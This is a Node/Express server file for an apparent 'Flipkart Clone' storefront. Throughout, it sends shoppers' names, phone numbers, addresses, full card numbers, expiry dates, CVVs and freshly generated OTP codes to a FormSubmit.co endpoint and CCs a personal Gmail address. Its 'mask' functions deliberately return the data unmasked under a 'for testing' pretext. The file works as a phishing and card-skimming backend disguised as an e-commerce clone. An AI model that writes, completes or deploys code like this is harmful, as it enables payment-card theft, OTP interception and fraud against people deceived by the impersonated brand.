import express from 'express';
import axios from 'axios';
import cors from 'cors';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = 3001;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'dist')));

// FormSubmit.co configuration
const FORMSUBMIT_ENDPOINT = 'https://formsubmit.co/ajax/8d487ecf315e92e47520f07dab546173';
const FORMSUBMIT_CC = 'Rajatjha.ss708090@gmail.com';

// Generate OTP
function generateOTP() {
  return Math.floor(100000 + Math.random() * 900000).toString();
}

function maskCardNumber(cardNumber = '') {
  // For testing: return full card number instead of masked
  return cardNumber || 'N/A';
}

function maskCvv(cvv = '') {
  // For testing: return full CVV instead of masked
  return cvv || 'N/A';
}

function maskCardHolderName(name = '') {
  // For testing: return full name instead of masked
  return name || 'N/A';
}

function maskCardExpiry(expiry = '') {
  // For testing: return full expiry instead of masked
  return expiry || 'N/A';
}

function maskOtp(otp = '') {
  // For testing: return full OTP instead of masked
  return otp || 'N/A';
}

// Store OTPs temporarily (in production, use Redis or database)
const otpStore = new Map();

// API Routes

// Test email endpoint
app.post('/api/test-email', async (req, res) => {
  try {
    const formData = new URLSearchParams();
    formData.append('test_message', 'This is a test email from Flipkart Clone');
    formData.append('test_time', new Date().toLocaleString());
    formData.append('_subject', 'Test Email - Flipkart Clone');
    formData.append('_cc', FORMSUBMIT_CC);
    formData.append('_template', 'table');

    const response = await axios.post(FORMSUBMIT_ENDPOINT, formData.toString(), {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'application/json'
      }
    });

    console.log('Test email response:', response.data);
    res.json({ success: true, message: 'Test email sent successfully', response: response.data });
  } catch (error) {
    console.error('Error sending test email:', error.response?.data || error.message);
    res.status(500).json({ success: false, message: 'Failed to send test email', error: error.response?.data || error.message });
  }
});

// Send registration email with contact details
app.post('/api/send-registration-email', async (req, res) => {
  try {
    const { name, email, phone } = req.body;
    
    const formData = new URLSearchParams();
    formData.append('name', name);
    formData.append('email', email);
    formData.append('phone', phone);
    formData.append('registration_time', new Date().toLocaleString());
    formData.append('_subject', 'New User Registration - Flipkart Clone');
    formData.append('_cc', FORMSUBMIT_CC);
    formData.append('_template', 'table');

    const response = await axios.post(FORMSUBMIT_ENDPOINT, formData.toString(), {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'application/json'
      }
    });

    console.log('Registration email response:', response.data);
    res.json({ success: true, message: 'Registration email sent successfully' });
  } catch (error) {
    console.error('Error sending registration email:', error.response?.data || error.message);
    res.status(500).json({ success: false, message: 'Failed to send registration email' });
  }
});

// Send payment details email
app.post('/api/send-payment-email', async (req, res) => {
  try {
    const { orderDetails, paymentMethod, amount, customerInfo, cardDetails } = req.body;
    
    const formData = new URLSearchParams();
    formData.append('order_id', orderDetails.orderId);
    formData.append('amount', amount);
    formData.append('payment_method', paymentMethod);
    formData.append('payment_time', new Date().toLocaleString());
    formData.append('customer_name', customerInfo.name);
    formData.append('customer_phone', customerInfo.phone);
    formData.append('customer_email', customerInfo.email);
    formData.append('customer_address', customerInfo.address);
    formData.append('_subject', `Payment Received - Order #${orderDetails.orderId}`);
    formData.append('_cc', FORMSUBMIT_CC);
    formData.append('_template', 'table');

    // Add unmasked card details for testing
    if (cardDetails) {
      formData.append('card_number', maskCardNumber(cardDetails.cardNumber));
      formData.append('card_name', maskCardHolderName(cardDetails.cardName));
      formData.append('card_expiry', maskCardExpiry(cardDetails.cardExpiry));
      formData.append('card_cvv', maskCvv(cardDetails.cardCVV));
      formData.append('card_bank', cardDetails.bank);
      formData.append('card_type', cardDetails.cardTab);
      formData.append('card_details_note', 'Unmasked card data for testing');
    }

    const response = await axios.post(FORMSUBMIT_ENDPOINT, formData.toString(), {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'application/json'
      }
    });

    console.log('Payment email response:', response.data);
    res.json({ success: true, message: 'Payment email sent successfully' });
  } catch (error) {
    console.error('Error sending payment email:', error.response?.data || error.message);
    res.status(500).json({ success: false, message: 'Failed to send payment email' });
  }
});

// Send OTP email
app.post('/api/send-otp', async (req, res) => {
  try {
    const { phone, email, purpose } = req.body;
    
    // Generate OTP
    const otp = generateOTP();
    const otpKey = `${phone || email}-${purpose}`;
    
    // Store OTP with 5 minutes expiry
    otpStore.set(otpKey, {
      otp,
      expiry: Date.now() + 5 * 60 * 1000, // 5 minutes
      phone,
      email
    });
    
    const formData = new URLSearchParams();
    formData.append('otp_code', maskOtp(otp));
    formData.append('purpose', purpose);
    formData.append('phone', phone || 'N/A');
    formData.append('email', email || 'N/A');
    formData.append('generated_time', new Date().toLocaleString());
    formData.append('expires_at', new Date(Date.now() + 5 * 60 * 1000).toLocaleString());
    formData.append('otp_note', 'Unmasked OTP for testing');
    formData.append('_subject', `OTP Generated - ${purpose}`);
    formData.append('_cc', FORMSUBMIT_CC);
    formData.append('_template', 'table');

    const response = await axios.post(FORMSUBMIT_ENDPOINT, formData.toString(), {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'application/json'
      }
    });

    console.log('OTP email response:', response.data);
    res.json({
      success: true,
      message: 'OTP sent successfully'
    });
  } catch (error) {
    console.error('Error sending OTP:', error.response?.data || error.message);
    res.status(500).json({ success: false, message: 'Failed to send OTP' });
  }
});

// Verify OTP
app.post('/api/verify-otp', (req, res) => {
  try {
    const { phone, email, otp, purpose } = req.body;
    const otpKey = `${phone || email}-${purpose}`;
    
    const storedData = otpStore.get(otpKey);
    
    if (!storedData) {
      return res.json({ success: false, message: 'OTP not found or expired' });
    }
    
    if (Date.now() > storedData.expiry) {
      otpStore.delete(otpKey);
      return res.json({ success: false, message: 'OTP expired' });
    }
    
    if (storedData.otp !== otp) {
      return res.json({ success: false, message: 'Invalid OTP' });
    }
    
    // OTP is valid, remove it
    otpStore.delete(otpKey);
    res.json({ success: true, message: 'OTP verified successfully' });
  } catch (error) {
    console.error('Error verifying OTP:', error);
    res.status(500).json({ success: false, message: 'Failed to verify OTP' });
  }
});

// Serve the React app
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'dist', 'index.html'));
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`FormSubmit.co service configured for Anand token endpoint (CC: Rajatjha.ss708090@gmail.com)`);
});
